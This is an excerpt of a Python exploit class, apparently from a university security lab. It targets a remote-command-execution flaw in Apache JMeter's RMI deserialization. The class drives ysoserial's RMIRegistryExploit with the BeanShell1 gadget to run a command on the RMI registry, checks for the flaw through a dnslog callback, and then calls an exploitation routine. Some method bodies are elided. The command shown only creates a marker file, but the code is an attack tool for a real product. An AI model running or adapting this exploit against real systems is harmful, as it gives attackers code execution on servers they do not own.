...
class JMeter:
    ...
    def RMIRegistryExploit(self,command):
        cmd = r'C:\Program Files\Java\jre1.8.0_461\bin\java -cp "C:\Users\veyde\OneDrive - ITMO UNIVERSITY\Работы ИТМО\InformationSecurity_Lab1\Lab2\ysoserial-all.jar" ysoserial.exploit.RMIRegistryExploit localhost 1099 BeanShell1 "touch /tmp/success"'
        try:
            print(subprocess.Popen(cmd, stdout=subprocess.PIPE,stderr=subprocess.PIPE))
        except:
            print('Использование ysoserial не удалось')
            sys.exit(0)

    def JmeterRMIpoc(self):
        print("[+] Проверка наличия уязвимости выполнения команд через десериализацию RMI в Jmeter")
        rand = self.randmd5()
        ...
        if re.status_code==200:
            ...
            print(rand)
            if rand in re.text:
                print('[+] Обнаружена уязвимость выполнения команд через десериализацию RMI в Jmeter')
                self.JmeterRMIexp()
            else:
                print('Нет отклика, проверка POC не удалась')
                sys.exit(0)
        else:
            print('Не удалось обратиться к адресу dnslog, проверка POC не удалась')
            sys.exit(0)

    def JmeterRMIexp(self):
        print("Эксплуатация уязвимости выполнения команд через десериализацию RMI в Jmeter")
        ...
        try:
            ...
            print("Эксплуатация уязвимости выполнения команд через десериализацию RMI в Jmeter завершена")
        except:
            sys.exit(0)
